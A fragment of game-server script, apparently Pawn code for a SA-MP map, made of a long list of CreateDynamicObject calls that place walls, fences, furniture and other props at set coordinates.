	CreateDynamicObject(19456, 2031.89600, -1917.51233, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2032.07300, -1917.51233, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2032.07300, -1874.44397, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2032.07300, -1868.20752, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2032.07300, -1881.56897, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2032.07300, -1888.70996, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2032.07300, -1898.30298, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2032.07300, -1907.90601, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.89600, -1907.90601, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.89600, -1898.30298, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.89600, -1888.70996, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.89600, -1881.56897, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.89600, -1874.44397, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.89600, -1868.20752, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2036.46436, -1863.48462, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2042.35156, -1863.48462, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2036.46436, -1863.66260, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2042.35156, -1863.66260, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2049.59937, -1863.66260, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2057.03955, -1863.66260, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2675.91382, -1947.47192, 13.25720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2057.03955, -1863.48462, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2049.59937, -1863.48462, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2066.67236, -1863.48462, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2890, 1789.09155, -1811.05518, 12.47998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(10183, 2067.68799, -1902.17822, 12.58700,   0.00000, 0.00000, -44.76000);
	CreateDynamicObject(19437, 2071.57349, -1882.46484, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19437, 2071.39697, -1882.46484, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19437, 2071.22095, -1882.46484, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(12978, 2041.03906, -1895.27246, 12.89200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(12978, 2041.03906, -1908.89661, 12.89200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(13027, 2041.03906, -1895.27246, 15.75270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(13027, 2041.03906, -1908.89661, 15.75270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19443, 2039.57654, -1883.31091, 12.72800,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2033.88098, -1888.21033, 15.76240,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1650, 2040.17773, -1883.64697, 14.78470,   0.00000, 0.00000, 69.71990);
	CreateDynamicObject(1650, 2040.17773, -1883.28308, 14.78470,   0.00000, 0.00000, 69.71990);
	CreateDynamicObject(1650, 2040.17773, -1882.95837, 14.78470,   0.00000, 0.00000, 69.71990);
	CreateDynamicObject(1650, 2040.17773, -1882.61890, 14.78470,   0.00000, 0.00000, 69.71990);
	CreateDynamicObject(1808, 2044.26001, -1884.84045, 13.43260,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2164, 2036.64880, -1888.07849, 13.46600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2608, 2033.97632, -1886.66943, 14.88603,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2165, 2035.67163, -1885.85046, 13.46317,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2033.68579, -1880.10486, 12.26730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2033.68579, -1880.10486, 15.76240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2033.68579, -1883.31482, 15.76240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2033.68579, -1883.31482, 12.26730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2033.68579, -1886.52307, 15.76240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2033.68579, -1886.52307, 12.26730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2855, 2043.71509, -1880.86108, 14.20870,   0.00000, 0.00000, -17.52000);
	CreateDynamicObject(2059, 2044.13550, -1881.28271, 14.22230,   0.00000, 0.00000, -33.18000);
	CreateDynamicObject(1723, 2043.20276, -1879.00159, 13.45810,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 2046.28333, -1879.00159, 13.41300,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19173, 2033.77185, -1883.74329, 14.85730,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19174, 2033.77185, -1880.25769, 14.75740,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19802, 2037.27136, 13.46370, 13.46370,   0.00000, 0.00000, 89.00000);
	CreateDynamicObject(1491, 2037.27136, -1884.82471, 13.46370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(12951, 2065.65186, -1833.61560, 12.53290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18238, 2061.65576, -1825.60437, 12.54050,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(8661, 2478.63306, -1774.06775, 12.57010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 2041.76233, -1824.38550, 13.01240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 2041.76233, -1828.51086, 13.01240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 2041.76233, -1832.65527, 13.01240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 2041.76233, -1837.43628, 13.01240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 2041.76233, -1835.01428, 13.01240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 2043.84253, -1839.51038, 13.01240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 2047.96289, -1839.51038, 13.01240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 2052.10938, -1839.51038, 13.01240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 2056.25732, -1839.51038, 13.01240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 2060.40161, -1839.51038, 13.01240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 2064.52539, -1839.51038, 13.01240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 2069.59009, -1839.51050, 13.01240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 2067.06763, -1839.51038, 13.01240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3578, 2052.21704, -1832.78271, 13.09958,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3578, 2060.04590, -1837.26636, 13.13480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1439, 2053.77734, -1830.06897, 12.61986,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1264, 2053.65259, -1830.01868, 13.43753,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1616, 2059.29126, -1829.98425, 16.28250,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1635, 2059.09326, -1834.34851, 16.17379,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(910, 2057.33179, -1830.13660, 13.75056,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11317, 2488.17529, -1761.95410, 17.77320,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19452, 2514.72583, -1748.77795, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 2476.22729, -1748.77795, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(8661, 2051.62451, -1873.22449, 12.55610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19376, 2465.72925, -1748.77795, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 2486.72729, -1748.77795, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 2497.22778, -1748.77795, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 2507.72852, -1748.77795, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 2465.72925, -1758.40405, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 2476.22729, -1758.40405, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 2486.72729, -1758.40405, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 2497.22778, -1758.40405, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 2507.72852, -1758.40405, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19452, 2465.29492, -1767.50720, 12.48890,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19452, 2514.72583, -1758.40405, 12.48890,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19452, 2474.92212, -1767.50720, 12.48890,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19452, 2484.55493, -1767.50720, 12.48890,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19452, 2465.27515, -1764.97327, 12.48890,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19452, 2474.92212, -1764.96985, 12.48890,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19452, 2484.55493, -1764.96863, 12.48890,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(3851, 2492.42627, -1743.96484, 14.53740,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 2479.27881, -1769.26465, 14.54940,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 2466.13501, -1769.26465, 14.54940,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 2460.46899, -1761.99011, 14.54940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3851, 2466.13672, -1743.96484, 14.53740,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 2479.27222, -1743.96484, 14.53740,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 2483.78564, -1763.24048, 13.08270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 2497.82300, -1745.13806, 13.08270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 2479.94263, -1763.24048, 13.08270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 2478.02295, -1763.24048, 13.08270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 2476.10352, -1763.24048, 13.08270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 2469.32520, -1763.24048, 13.08270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 2467.40649, -1763.24048, 13.08270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 2465.48608, -1763.24048, 13.08270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 2463.56445, -1763.24048, 13.08270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 2461.64355, -1763.24048, 13.08270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 2481.86353, -1763.24048, 13.08270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 2497.82300, -1757.94226, 13.08270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 2497.82300, -1747.06006, 13.08270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 2497.82300, -1756.02295, 13.08270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 2497.82300, -1748.98083, 13.08270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 2497.82300, -1754.10242, 13.08270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2493.97266, -1756.08008, 12.64608,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2463.12476, -1766.43579, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2476.21729, -1766.43579, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2468.65015, -1766.43579, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2481.98218, -1766.43579, 12.64608,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2486.79932, -1756.08008, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2486.79932, -1747.01782, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2493.97266, -1747.01782, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2480.73804, -1758.70581, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2480.00903, -1747.01782, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2473.19189, -1747.01758, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2466.70581, -1747.01782, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2463.52734, -1752.87036, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13646, 2463.62183, -1759.15027, 12.64610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2165, 2510.43433, -1755.66284, 12.55270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2173, 2508.44312, -1755.66284, 12.55270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2165, 2514.38867, -1755.66284, 12.40593,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2173, 2512.41235, -1755.66284, 12.55270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2165, 2506.46753, -1755.66284, 12.55270,   0.00000, 0.00000, -0.54000);
	CreateDynamicObject(2166, 2504.51440, -1756.64539, 12.55270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2165, 2504.52563, -1758.62854, 12.55270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1671, 2514.82129, -1756.46582, 13.00070,   0.00000, 0.00000, -193.79990);
	CreateDynamicObject(1671, 2510.86646, -1756.46582, 13.00070,   0.00000, 0.00000, -193.79990);
	CreateDynamicObject(1671, 2506.87720, -1756.46582, 13.00070,   0.00000, 0.00000, -193.79990);
	CreateDynamicObject(1671, 2505.26807, -1758.17261, 13.00070,   0.00000, 0.00000, -108.48009);
	CreateDynamicObject(1723, 2503.54199, -1758.58545, 12.54380,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1723, 2498.57690, -1744.49146, 12.54380,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1723, 2500.54443, -1758.58545, 12.54380,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2011, 2504.44019, -1744.51563, 12.53620,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1723, 2501.59961, -1744.49146, 12.54380,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19174, 2515.87402, -1746.22986, 14.61133,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19175, 2515.87402, -1750.14478, 14.61130,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19173, 2513.64746, -1759.09436, 14.61961,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19172, 2507.75244, -1759.09436, 14.64880,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(19430, 2458.73462, -1770.33374, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1771.93384, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1773.53040, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1775.13428, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1776.73853, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2516.90283, -1784.03271, 16.39688,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2458.73462, -1779.94287, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1781.54504, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1783.14795, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2484.13574, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2482.55396, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2480.96411, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2479.38257, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2477.77954, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2476.18140, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2474.58081, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2472.98901, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2471.40771, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2469.82764, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2459.43799, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2468.22998, -1784.03003, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2458.73462, -1768.75208, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1766.90247, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1765.29883, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1763.71326, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1762.14685, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1760.56311, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1758.95972, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.23584, -1742.43994, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2457.84497, -1758.26245, 12.73200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 2458.20581, -1742.43994, 16.21490,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3466, 1769.34473, -1757.28931, 15.07300,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3464, 1742.69690, -1757.25806, 14.84770,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(8647, 1796.79724, -1799.37781, 13.38080,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3464, 1796.01233, -1757.31580, 14.84770,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3444, 1796.62842, -1786.04236, 15.07370,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3444, 1715.80713, -1757.25940, 15.07370,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(8647, 1809.12793, -1757.14539, 13.38080,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1412, 1738.95691, -1807.50305, 13.76843,   0.00000, 0.00000, -14.45999);
	CreateDynamicObject(1412, 1743.96375, -1808.79724, 13.76843,   0.00000, 0.00000, -14.45999);
	CreateDynamicObject(1412, 1781.67969, -1802.16809, 13.76840,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3169, 1708.01611, -1778.94617, 12.49990,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1412, 1748.97900, -1810.14294, 13.76843,   0.00000, 0.00000, -15.60000);
	CreateDynamicObject(1412, 1753.96509, -1811.52710, 13.76843,   0.00000, 0.00000, -15.60000);
	CreateDynamicObject(1412, 1781.68726, -1807.34351, 13.76840,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1412, 1781.69202, -1812.51123, 13.76840,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1412, 2281.73804, -2064.59277, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 1781.76392, -1818.94092, 13.76840,   0.00000, 0.00000, 164.93973);
	CreateDynamicObject(1412, 1776.77344, -1817.59961, 13.76840,   0.00000, 0.00000, 164.93973);
	CreateDynamicObject(1412, 1771.76636, -1816.24646, 13.76840,   0.00000, 0.00000, 164.93973);
	CreateDynamicObject(1412, 1702.38025, -1774.95557, 14.03420,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1412, 1766.75903, -1814.89441, 13.76840,   0.00000, 0.00000, 164.93973);
	CreateDynamicObject(1412, 1702.38745, -1780.12646, 14.03420,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1412, 1702.39111, -1785.30701, 14.03420,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1412, 1702.39063, -1790.47253, 14.03420,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1412, 1702.38525, -1795.64136, 14.03420,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1412, 1702.38318, -1799.15002, 14.03420,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3284, 1724.48462, -1777.78992, 14.40530,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3285, 1725.57886, -1798.93115, 14.40530,   0.00000, 0.00000, -105.00010);
	CreateDynamicObject(3242, 1751.50439, -1807.06116, 14.40530,   0.00000, 0.00000, 164.99980);
	CreateDynamicObject(3284, 1744.29407, -1781.24414, 14.40530,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3170, 1778.83679, -1796.89038, 12.49590,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1410, 1768.36987, -1779.34656, 13.16640,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1410, 1768.36987, -1784.00574, 13.16640,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1410, 1749.59241, -1774.63721, 13.16640,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1410, 1778.27808, -1786.58813, 13.16640,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1410, 1780.52429, -1788.91370, 13.16640,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1410, 1749.59241, -1779.29565, 13.16640,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3171, 1754.85925, -1775.51672, 12.46120,   0.00000, 0.00000, 80.82003);
	CreateDynamicObject(3171, 1762.81299, -1776.31519, 12.46120,   0.00000, 0.00000, 96.24010);
	CreateDynamicObject(3168, 1774.42957, -1810.31091, 12.46120,   0.00000, 0.00000, 321.11935);
	CreateDynamicObject(3168, 1738.83704, -1802.21448, 12.46120,   0.00000, 0.00000, 257.27966);
	CreateDynamicObject(2890, 2043.52136, -1902.00122, 12.47998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3035, 1810.43311, -1800.90234, 13.30830,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3035, 1808.17114, -1800.90234, 13.30830,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(854, 1361.62573, -1713.97839, 7.96050,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(854, 1359.44580, -1713.69275, 7.96050,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(854, 1363.72998, -1714.40686, 7.96050,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(854, 1362.80652, -1713.01367, 7.96050,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(852, 1362.81628, -1715.53076, 7.54026,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(852, 1357.31116, -1712.90466, 7.54026,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(852, 1358.79358, -1714.68726, 7.54026,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(852, 1358.79358, -1714.68726, 7.54026,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1441, 1358.03418, -1710.79053, 8.19420,   0.00000, 0.00000, 42.53998);
	CreateDynamicObject(852, 1359.11768, -1712.23560, 7.54026,   0.00000, 0.00000, 26.70000);
	CreateDynamicObject(2744, 1358.80164, -1718.99426, 9.23575,   4.00000, -33.00000, 0.00000);
	CreateDynamicObject(952, 1362.60986, -1717.60266, 8.12280,   -24.00000, 40.00000, 0.00000);
	CreateDynamicObject(12957, 1355.91760, -1706.37366, 8.26527,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3593, 1359.48145, -1709.65320, 8.49400,   11.00000, 0.00000, 85.00000);
	CreateDynamicObject(640, 1415.71130, -1678.47095, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1415.71130, -1683.84827, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1415.71130, -1689.22705, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1415.71130, -1694.60583, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1415.71130, -1699.98096, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1415.71130, -1705.35645, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1401.55115, -1678.47058, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1401.55115, -1683.84583, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 1408.63733, -1707.67773, 13.21780,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1401.55115, -1689.22241, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1401.55115, -1694.59802, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1401.55115, -1699.97607, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1401.55115, -1705.35120, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 1408.63733, -1670.76025, 13.21780,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1412.67395, -1670.74219, 13.21780,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19372, 1407.12549, -1705.72888, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1410.60864, -1705.72888, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1705.72888, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1702.54785, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1699.34656, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1696.13928, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1692.93689, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1689.72961, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1686.64734, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1683.53040, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1680.42542, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1677.36328, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1672.36023, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1414.07910, -1674.74255, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1410.60864, -1702.54785, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1407.12549, -1702.54785, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1403.63550, -1702.54785, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1410.60864, -1699.34595, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1407.12549, -1699.34595, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1403.63550, -1699.34692, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1410.60864, -1696.13928, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1407.12549, -1696.13928, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1403.63550, -1696.13928, 12.57060,   0.00000, 90.00000, 0.00000);
